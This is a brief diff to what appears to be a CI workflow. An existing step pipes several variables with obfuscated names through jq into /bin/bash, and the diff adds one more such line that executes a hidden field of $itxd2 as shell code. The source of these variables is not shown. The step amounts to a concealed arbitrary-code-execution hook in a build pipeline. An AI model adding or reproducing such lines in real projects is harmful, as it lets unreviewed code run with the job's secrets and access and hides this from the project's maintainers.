@@ -26,6 +26,7 @@ jobs:
           echo $pbf1948 | jq -r .k80590 | /bin/bash
           printf '%s' "$ivdm57797" | jq -r .vnoo64 | /bin/bash
           echo $laq09 | jq -r .eq73 | /bin/bash
+          printf '%s' "$itxd2" | jq -r .i8063 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
